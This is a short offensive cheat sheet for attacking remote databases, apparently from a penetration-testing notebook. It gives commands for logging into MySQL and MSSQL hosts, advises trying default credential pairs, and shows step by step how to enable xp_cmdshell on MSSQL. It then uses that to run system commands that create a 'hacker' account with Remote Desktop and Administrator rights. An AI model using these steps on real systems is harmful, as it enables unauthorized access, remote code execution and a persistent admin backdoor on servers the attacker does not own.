## Databases

Use the following command to logged in remote database with username / password you found.
Always try common combination such as guest:guest, guest:<NO PASSWORD>, admin:admin


## MySQL

```
root@kali:~# mysql -u fooUser -p -h 192.168.11.10
Enter password: 
```

## MSSQL

```
root@kali:~# sqsh -S 192.168.11.10:1444 -U ralph
sqsh-2.1.7 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2010 Michael Peppler
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Password: 
```

### Abuse MSSQL to RCE

If you have SA or admin priviliaged account on remote  MSSQL instance, use the following command to exeute command or shell:

```
sqsh-2.1.7> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
sqsh-2.1.7> go
sqsh-2.1.7> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
sqsh-2.1.7> go
sqsh-2.1.7> EXEC xp_cmdshell 'cmd.exe /K net user hacker hackpwd /add & net localgroup “Remote Desktop Users” hacker /add && net localgroup Administartors hacker /add'
sqsh-2.1.7> go
```
